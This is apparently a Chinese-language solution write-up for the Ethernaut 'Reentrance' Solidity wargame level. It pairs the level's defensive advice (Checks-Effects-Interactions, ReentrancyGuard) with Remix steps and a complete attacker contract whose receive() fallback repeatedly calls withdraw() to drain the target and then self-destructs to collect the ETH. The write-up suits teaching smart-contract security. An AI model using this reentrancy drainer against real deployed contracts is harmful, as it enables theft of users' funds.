Reentrance
------------------------------------
为了防止转移资产时的重入攻击, 使用 Checks-Effects-Interactions pattern(https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) 注意 call 只会返回 false 而不中断执行流. 其它方案比如 ReentrancyGuard(https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) 或 PullPayment(https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) 也可以使用.

transfer 和 send 不再被推荐使用, 因为他们在 Istanbul 硬分叉之后可能破坏合约
Source 1(https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/)
Source 2(https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

总是假设资产的接受方可能是另一个合约, 而不是一个普通的地址. 因此, 他有可能执行了他的payable fallback 之后又“重新进入” 你的合约, 这可能会打乱你的状态或是逻辑.

重进入是一种常见的攻击. 你得随时准备好!
------------------------------------
1.打开Remix
2.将Reentrance合约复制进文件
3.将以代码放入同一文件中
contract Reentrance1 {
    Reentrance public reentrance;
    uint256 public balances;
    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function withdrawTest() public {
        balances = reentrance.balanceOf(address(this));
        reentrance.withdraw(balances);
    }

    function obtainETH(address payable owner) public {
        selfdestruct(owner);
    }

    receive() external payable {
        reentrance.withdraw(balances);
    }
4.调用Reentrance合约的donate方法传入Reentrance1合约地址并存入ETH
5.调用Reentrance1合约的withdrawTest方法获取ETH